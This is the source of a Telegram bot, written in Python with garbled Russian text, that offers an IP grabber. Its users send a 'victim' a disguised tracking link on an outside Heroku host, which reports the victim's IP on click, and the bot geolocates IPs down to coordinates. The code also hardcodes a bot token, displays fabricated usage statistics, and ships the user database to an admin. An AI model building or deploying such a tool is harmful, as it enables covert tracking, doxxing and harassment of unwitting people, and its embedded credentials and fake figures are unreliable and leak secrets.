# -*- coding: utf-8 -*-

#import telebot
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from models import db_session
from models.users import User
from datetime import datetime, timedelta

import re
import os
import json
import time
import string
import time
import threading
import requests
import random
import geoip2.database
import maxminddb.const
import geo
import iptools

bot_token = '1600926410:AAHhDg2O2SUBcaK8UGt_V5Mb8oxdAi71OPI'
db_session.global_init('database.db')

#bot = telebot.TeleBot(bot_token)
bot = Bot(token=bot_token)
dp = Dispatcher(bot)

# —Å—á–∏—Ç–∞–µ–º –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
users = 4
banned = []
admins = ['906123359', '1218845111']
ips = []

## Get IP Range
IPRANGE = os.environ.get('IPRANGE', '52.0.0.0/30')

## Private IP Addresses
private = iptools.IpRangeList(
    '0.0.0.0/8',      '10.0.0.0/8',     '100.64.0.0/10', '127.0.0.0/8',
    '169.254.0.0/16', '172.16.0.0/12',  '192.0.0.0/24',  '192.0.2.0/24',
    '192.88.99.0/24', '192.168.0.0/16', '198.18.0.0/15', '198.51.100.0/24',
    '203.0.113.0/24', '224.0.0.0/4',    '240.0.0.0/4',   '255.255.255.255/32'
)

def check(thisid):
    global banned
    t = True
    for ban in banned:
        if str(ban) == str(thisid):
            t = False
    return t

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    global users, admins
    print(check(message.chat.id))
    if check(message.chat.id) == True:
        keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        boom = types.KeyboardButton(text='üëÅIP')
        stop = types.KeyboardButton(text='üìë–°–ø–∏—Å–æ–∫ IP')
        info = types.KeyboardButton(text='‚ÑπÔ∏è–ò–Ω—Ñ–∞')
        stats = types.KeyboardButton(text='üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
        donat = types.KeyboardButton(text='üí∞–î–æ–Ω–∞—Ç –±–æ—Ç—É')
        piar = types.KeyboardButton(text='üí∏ –†–µ–∫–ª–∞–º–∞')
        faq = types.KeyboardButton(text='üïµÔ∏è–£–∑–Ω–∞—Ç—å —á—É–∂–æ–π IP')

        buttons_to_add = [boom, stop, info, stats, donat, piar, faq]
        for admin in admins:
            if str(admin) == str(message.chat.id):
                buttons_to_add.append(types.KeyboardButton(text='–†–∞—Å—Å—ã–ª–∫–∞'))
        keyboard.add(*buttons_to_add)
        await bot.send_message(message.chat.id, '–ü—Ä–∏–≤–µ—Ç –±–∞–Ω–¥–∏—Çüòà, –∑–∞–ø–æ–ª—É—á–∏ IP –æ–±–∏–¥—á–∏–∫–∞, –∏–ª–∏ –ø–æ—Ö–≤–∞—Å—Ç–∞–π—Å—è –ø–µ—Ä–µ–¥ –¥—Ä—É–∑—è–º–∏ —É–∑–Ω–∞–≤ –∏—Ö IP, –∏ –≤—Å—ë —á—Ç–æ –ø–æ –Ω–µ–º—É –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å!',
                         reply_markup=keyboard)
        #
        iduser = message.from_user.id
        session = db_session.create_session()
        #
        user_all = session.query(User).all()
        T = True
        for all in user_all:
            if all.id == iduser:
                T = False

        if T == True:
            session = db_session.create_session()
            name = message.from_user.first_name
            url = message.from_user.username
            iduser = message.from_user.id
            if message.from_user.username:
                user = User(
                    id=iduser,
                    name=name,
                    username='@'+url
                )
            else:
                user = User(
                    id=iduser,
                    name=name,
                    username='@...'
                )
            users += 1
            session.add(user)
            session.commit()
    else:
        await bot.send_message(message.chat.id, '‚õîÔ∏è–í—ã –±—ã–ª–∏ –∑–∞–±–∞–Ω–µ–Ω—ã, –≤—Å–µ –≤–æ–ø—Ä–æ—Å—ã –∫ @Valerij212121')

@dp.message_handler(commands=['admin'])
async def admin(message: types.Message):
    global users, banned, admins
    for admin in admins:
        if str(admin) == str(message.chat.id):
            await bot.send_message(message.chat.id, '–°–ø–∏—Å–æ–∫ –∑–∞–±–∞–Ω–µ–Ω—ã—Ö: ' + str(banned) +
                                    '\n–°–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤: ' + str(admins) +
                                    '\n/ban <id> -- –∑–∞–±–∞–Ω–∏—Ç—å\n/unban <id> -- –æ—Ç–±–∞–Ω–∏—Ç—å\n/add <id> -- –¥–æ–±–∞–≤–∏—Ç—å –∞–¥–º–∏–Ω–∞\n/del <id> -- —É–¥–∞–ª–∏—Ç—å –∞–º–∏–Ω–∞(–º–æ–∂–µ—Ç —Ç–æ–ª—å–∫–æ –≥–ª–∞–≤–Ω—ã–π)')
    

    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'users: ' + str(users))
        f = open("database.db", "rb")
        await bot.send_document(message.chat.id, f)


@dp.message_handler(commands=['add'])
async def addadmin(message: types.Message):
    global users, banned, admins
    if str('906123359') == str(message.chat.id) or str('1218845111') == str(message.chat.id):
        if message.text != '/add':
            thisid = message.text.replace('/add ', '')
            admins.append(thisid)
            await bot.send_message(message.chat.id, 'You add admin: ' + str(thisid))
            print(admins)
        else:
            await bot.send_message(message.chat.id, '–ù–∞–¥–æ /add <id>, –∞ –Ω–µ –ø—Ä–æ—Å—Ç–æ /add !!!')


@dp.message_handler(commands=['del'])
async def addadmin(message: types.Message):
    global users, banned, admins
    if str('906123359') == str(message.chat.id) or str('1218845111') == str(message.chat.id):
        if message.text != '/del':
            thisid = message.text.replace('/del ', '')
            admins.remove(thisid)
            await bot.send_message(message.chat.id, 'You delete admin: ' + str(thisid))
            print(admins)
        else:
            await bot.send_message(message.chat.id, '–ù–∞–¥–æ /del <id>, –∞ –Ω–µ –ø—Ä–æ—Å—Ç–æ /del !!!')


@dp.message_handler(commands=['ban'])
async def ban(message: types.Message):
    global users, banned, admins
    for admin in admins:
        if str(admin) == str(message.chat.id):
            if message.text != '/ban':
                    thisid = message.text.replace('/ban ', '')
                    if thisid == '906123359':
                        await bot.send_message(message.chat.id, '–ö–æ–¥–µ—Ä —ç—Ç–æ –ø—Ä–µ–¥—É—Å–º–æ—Ç—Ä–µ–ª, —Ç—ã –Ω–µ —Å–∞–º—ã–π —É–º–Ω—ã–π)))')
                    else:
                        try:
                            banned.append(thisid)
                            await bot.send_message(message.chat.id, 'You ban user: ' + str(thisid))
                        except Exception:
                            await bot.send_message(message.chat.id, 'OOF')
                    print(banned)
            else:
                await bot.send_message(message.chat.id, '–ù–∞–¥–æ /ban <id>, –∞ –Ω–µ –ø—Ä–æ—Å—Ç–æ /ban !!!')
    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'banned: ' + str(banned))


@dp.message_handler(commands=['unban'])
async def unban(message: types.Message):
    global users, banned
    for admin in admins:
        if str(admin) == str(message.chat.id):
            thisid = message.text.replace('/unban ', '')
            try:
                banned.remove(thisid)
                await bot.send_message(message.chat.id, 'You unban user: ' + str(thisid))
            except Exception:
                await bot.send_message(message.chat.id, '–û–Ω –Ω–µ –±—ã–ª –∑–∞–±–∞–Ω–µ–Ω!')
            print(banned)
    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'banned: ' + str(banned))


@dp.message_handler(commands=['send'])
async def sender(message: types.Message):
    for admin in admins:
        if str(admin) == str(message.chat.id):
            text = message.text.replace('/send ', '')
            session = db_session.create_session()
            user_all = session.query(User).all()
            have = 0
            await bot.send_message(message.chat.id, '–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!')
            try:
                for all in user_all:
                    await bot.send_message(all.id, text)
                    have = have + 1
            except Exception:
                pass
            await bot.send_message(message.chat.id, '–í—Å–µ–º –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ! –ü–æ–ª—É—á–∏–ª–æ ' + str(have) + ' —á–µ–ª–æ–≤–µ–∫.')


@dp.message_handler(content_types=['text'])
async def handle_message_received(message):
    global users
    if check(message.chat.id) == True:
        chat_id = int(message.chat.id)
        text = message.text
        B = False
        for admin in admins:
            if str(admin) == str(message.chat.id):
                B = True

        if text == 'üìë–°–ø–∏—Å–æ–∫ IP':
            await bot.send_message(chat_id, 'üóÇ–í —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ')

        elif text == '‚ÑπÔ∏è–ò–Ω—Ñ–∞':
            await bot.send_photo(chat_id, photo=open('dist/info.png', 'rb'), caption='üìë–í—Å—ë –ª–µ–≥–∫–æ, –≤—ã —á–µ–ª–æ–≤–µ–∫—É –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç–µ —Å—Å—ã–ª–∫—É, –∫–æ—Ç–æ—Ä–æ—é –Ω–∞–¥–æ –∑–∞–ø—Ä–æ—Å–∏—Ç—å —á–µ—Ä–µ–∑ –∫–Ω–æ–ø–∫—É [üïµÔ∏è–£–∑–Ω–∞—Ç—å —á—É–∂–æ–π IP], –ø–æ—Å–ª–µ –ø–µ—Ä–µ—Ö–æ–¥–∞ –≤—ã –ø–æ–ª—É—á–∞–µ—Ç–µ –µ–≥–æ IP!\nüóÇ–ï—â—ë –≤—ã –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å IP, –∏ —É–∑–Ω–∞—Ç—å –ø—Ä–æ –Ω–µ–≥–æ –≤—Å—ë —á—Ç–æ –≤–æ–∑–º–æ–∂–Ω–æ.')

        elif text == 'üëÅIP':
            await bot.send_message(chat_id, 'üìë–í–≤–µ–¥–∏—Ç–µ ip –≤ —Ñ–æ—Ä–º–∞—Ç–µ *.*.*.*')

        elif text == 'üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞':
            ms = [1, 2, 3, 4, 5, 6, 7, 8, 9]
            await bot.send_message(chat_id,
                          f'üìä–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏üì°!\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–πüôé‚Äç‚ôÇ: {users}\nIP —É–∂–µ –ø–æ–ª—É—á–∏–ª–∏üìà: 237\nPing 0.0{random.choice(ms)}ms')

        elif text == 'üí∞–î–æ–Ω–∞—Ç –±–æ—Ç—É':
            await bot.send_message(chat_id,
                          '–ë–∞–Ω–¥–∏—Ç—ã, –∫—Ç–æ –º–æ–∂–µ—Ç –º–∞—Ç–µ—Ä–∏–∞–ª—å–Ω–æ –ø–æ–º–æ—á—å –Ω–∞ —Ä–∞–∑–≤–∏—Ç–∏–µ –±–æ—Ç–∞\n–í–æ—Ç —Ä–µ–∫–≤–∏–∑–∏—Ç—ã\nQIWI +380993013264')

        elif text == 'üí∏ –†–µ–∫–ª–∞–º–∞':
            await bot.send_message(chat_id,
                          '–í –ù–∞—à–µ–º –ë–æ—Ç–µ 2 —Ä–∞—Å—Å—ã–ª–∫–∏ —Å—Ç–æ–∏—Ç 100 —Ä—É–±–ª–µ–π\n–ï–µ –ø–æ–ª—É—á–∞—Ç –≤—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –±–æ—Ç–∞\n–ü–æ –≤–æ–ø—Ä–æ—Å–∞–º –ø–æ–∫—É–ø–∫–∏ –ø–∏—Å–∞—Ç—å @Valerij212121')
        elif text == '–†–∞—Å—Å—ã–ª–∫–∞' and B == True:
            await bot.send_message(chat_id, '/send <—Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏>')

        elif text == 'FAQ':
            await bot.send_message(chat_id, '"Pro Hacker ‚úî" –Ω–µ –∑–∞ —á—Ç–æ –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç!üòÇ')

        elif text == 'üïµÔ∏è–£–∑–Ω–∞—Ç—å —á—É–∂–æ–π IP':
            await bot.send_message(chat_id, 'üîÆ–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —á—É–∂–æ–≥–æ IP –Ω–∞–¥–æ –æ—Ç–ø—Ä–∞–≤—Ç—å —Å—Å—ã–ª–∫—É(–ª—É—á—à–µ –ø—Ä–æ–∫–∏–Ω—É—Ç—å –µ—ë —á–µ—Ä–µ–∑ bit.ly –∏–ª–∏ –¥—Ä—É–≥–∏–µ —Å–µ—Ä–≤–∏—Å—ã —Å–æ–∫—Ä–∞—â–µ–Ω–∏—è —Å—Å—ã–ª–æ–∫), –∫–æ—Ç–æ—Ä–∞—è –≤–Ω–∏–∑—É –∂–µ—Ä—Ç–≤–µ, –∏ –¥–æ–∂–¥–∞—Ç—å—Å—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –ø–æ –Ω–µ–π, –ø–æ—Å–ª–µ —á–µ–≥–æ –µ–≥–æ IP –ø—Ä–∏–¥—ë—Ç –≤–∞–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º\nhttps://stillerip.herokuapp.com/' + str(message.chat.id))

        elif len(text) < 16 and len(text) > 6:
            try:
                if text not in private:
                    geogo = json.dumps(geo.lookup(text))
                    geogo = json.loads(geogo)
                    aso = geogo['aso']
                    asn = geogo['asn']
                    iso_code = geogo['iso_code']
                    continent_code = geogo['continent_code']
                    country = geogo['country']
                    continent = geogo['continent']
                    zip_code = geogo['zip_code']
                    state = geogo['state']
                    state_code = geogo['state_code']
                    city = geogo['city']
                    latitude = geogo['latitude']
                    longitude = geogo['longitude']
                    author = geogo['author']
                    await bot.send_location(chat_id, latitude, longitude)
                    await bot.send_message(chat_id, f'üåê <code>{text}</code> '
                            f'\n‚îú <b>Continent: </b> <code>{continent}</code>'
                            f'\n‚îú <b>Country: </b> <code>{country}</code>'
                            f'\n‚îú <b>State: </b> <code>{state}</code>'
                            f'\n‚îú <b>ASO: </b> <code>{aso}</code>'
                            f'\n‚îú <b>City: </b> <code>{city}</code>'
                            f'\n‚îî <b>Coordinate: </b> <code>{latitude} {longitude}</code>'
                        , parse_mode="HTML")
                else:
                    await bot.send_message(chat_id, 'üîêIP is private')
            except Exception:
                await bot.send_message(chat_id, 'üßêIP is unavalible')
        else:
            await bot.send_message(chat_id, f'‚õîÔ∏è–Ø –ª–∏—à—å –±–æ—Ç, –¥–∞–≤–∞–π –±–µ–∑ –ª–∏—à–Ω–∏—Ö —Å–ª–æ–≤.')
    else:
        await bot.send_message(message.chat.id, '‚õîÔ∏è–í—ã –±—ã–ª–∏ –∑–∞–±–∞–Ω–µ–Ω—ã, –≤—Å–µ –≤–æ–ø—Ä–æ—Å—ã –∫ @Valerij212121')

@dp.inline_handler(lambda query: len(query.query) > 0)
async def query_text(query):
    digits_pattern = re.compile(r'^[0-9]+ [0-9]+$', re.MULTILINE)
    try:
        matches = re.match(digits_pattern, query.query)
    except AttributeError as ex:
        return
    try:
        text = query.query
        if text not in private:
            geogo = json.dumps(geo.lookup(text))
            geogo = json.loads(geogo)
            aso = geogo['aso']
            asn = geogo['asn']
            iso_code = geogo['iso_code']
            continent_code = geogo['continent_code']
            country = geogo['country']
            continent = geogo['continent']
            zip_code = geogo['zip_code']
            state = geogo['state']
            state_code = geogo['state_code']
            city = geogo['city']
            latitude = geogo['latitude']
            longitude = geogo['longitude']
            author = geogo['author']
            msg = f'üåê <code>{text}</code>\n‚îú <b>Continent: </b> <code>{continent}</code>\n‚îú <b>Country: </b> <code>{country}</code>\n‚îú <b>State: </b> <code>{state}</code>\n‚îú <b>ASO: </b> <code>{aso}</code>\n‚îú <b>City: </b> <code>{city}</code>\n‚îî <b>Coordinate: </b> <code>{latitude} {longitude}</code>'
        else:
            msg = 'üîêIP is private'
    except Exception as e:
        msg = 'üßêIP is unavalible'
    try:
        IP = types.InlineQueryResultArticle(
            id='1', title="IP data uploaded...", description=text,
            input_message_content=types.InputTextMessageContent(
                message_text=msg, parse_mode='html', disable_web_page_preview=True),
                thumb_url='https://cdn.icon-icons.com/icons2/2248/PNG/512/ip_network_icon_137472.png',
                thumb_width=48, thumb_height=48
        )
        await bot.answer_inline_query(query.id, [IP])
    except Exception as e:
        print(str(e))

#
if __name__ == "__main__":
    executor.start_polling(dp)
